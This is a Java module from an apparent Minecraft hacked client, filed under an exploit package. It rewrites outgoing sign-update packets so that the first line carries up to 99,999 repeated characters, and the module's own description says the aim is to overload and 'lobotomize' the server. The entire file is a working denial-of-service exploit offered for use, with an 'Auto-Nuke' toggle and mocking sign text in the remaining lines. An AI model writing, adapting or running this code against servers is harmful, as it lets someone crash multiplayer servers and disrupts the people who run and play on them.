package me.ht9.rose.feature.module.modules.exploit.infinitesign;

import me.ht9.rose.event.bus.annotation.SubscribeEvent;
import me.ht9.rose.event.events.PacketEvent;
import me.ht9.rose.feature.module.Module;
import me.ht9.rose.feature.module.annotation.Description;
import me.ht9.rose.feature.module.setting.Setting;
import net.minecraft.src.Packet130UpdateSign;

@Description("Overloads sign packets to lobotomize the server. 99,999 chars of pure chaos.")
public final class InfiniteSign extends Module {
    private final Setting<Integer> power = new Setting<>("Payload Size", 1000, 99999, 100000);
    private final Setting<String> character = new Setting<>("Char", "a");
    private final Setting<Boolean> autoPlace = new Setting<>("Auto-Nuke", true);

    @SubscribeEvent
    public void onPacket(PacketEvent event) {
        if (event.packet() instanceof Packet130UpdateSign packet) {
            // THE HOSE FORK OVERRIDE
            // We take the standard 4 lines and replace line 1 with a 'nuke'
            String nuke = String.valueOf(character.value()).repeat(power.value());
            
            packet.signLines = new String[] {
                nuke,           // Line 1: The Payload
                "HAS",          // Line 2: The
                "ABANDONED",    // Line 3: Message
                "YOU"           // Line 4: Of Doom
            };
        }
    }
}
